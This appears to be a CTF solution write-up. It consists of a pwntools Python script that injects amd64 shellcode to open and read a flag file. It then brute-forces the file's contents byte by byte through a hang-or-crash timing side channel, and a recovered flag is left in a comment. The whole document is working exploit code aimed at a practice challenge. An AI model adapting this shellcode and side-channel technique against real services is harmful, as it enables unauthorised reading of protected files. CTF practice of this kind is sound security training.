shellcode+侧信道爆破

```py
from pwn import *
import sys

context.arch = 'amd64'
s = "{}0123456789-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
list = [ord(x) for x in s]
flag = ""

def log_info(message, status=None):
    """带颜色的日志输出函数"""
    color_codes = {
        'success': '\033[92m',  # 绿色
        'error': '\033[91m',    # 红色
        'warning': '\033[93m',  # 黄色
        None: '\033[95m'        # 紫色(默认)
    }
    color = color_codes.get(status, '\033[95m')
    print(f"{color}[*] {message}\033[0m")

shellcode = """
mov rdi, 0x67616c662f2e
push rdi
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall

mov rdi, 3
mov rsi, rsp
mov rdx, 0x100
mov rax, 0
syscall

mov bl, byte ptr [rsp+{}]
cmp bl, {}
jz $-0x3 
"""

index = 0
MAX_RETRY = 3  # 最大重试次数

while True:
    for i in range(len(s)):
        retry_count = MAX_RETRY
        success = False
        
        while retry_count > 0 and not success:
            p = None
            try:
                # 创建新连接
                p = process('./pwn')
                # p = remote('node10.anna.nssctf.cn', 25611)
                
                # 发送payload
                payload = asm(shellcode.format(index, list[i]))
                p.sendlineafter(b'Please input your shellcode: \n', payload)  # 注意这里要发送bytes

                # 接收判断
                try:
                    judge = p.recv(timeout=3)  # 缩短超时时间
                except EOFError:
                    log_info(f"字符 {s[i]} 导致崩溃，正在重试 ({MAX_RETRY-retry_count+1}/{MAX_RETRY})", 'warning')
                    p.close()
                    retry_count -= 1
                    continue
                
                # 判断逻辑
                if not judge:
                    flag += s[i]
                    log_info(f"当前进度: {flag}", 'success')
                    index += 1
                    success = True
                p.close()
                
            except Exception as e:
                log_info(f"未知错误: {str(e)}", 'error')
                if p:
                    p.close()
                retry_count -= 1
            finally:
                if p:
                    p.close()

        if success:
            break
                
    if '}' in flag:
        log_info(f"最终flag: {flag}", 'success')
        sys.exit(0)

#  当前进度: {b82ab22b-b373-489e-ac74-6c3fb26e82cf}

```

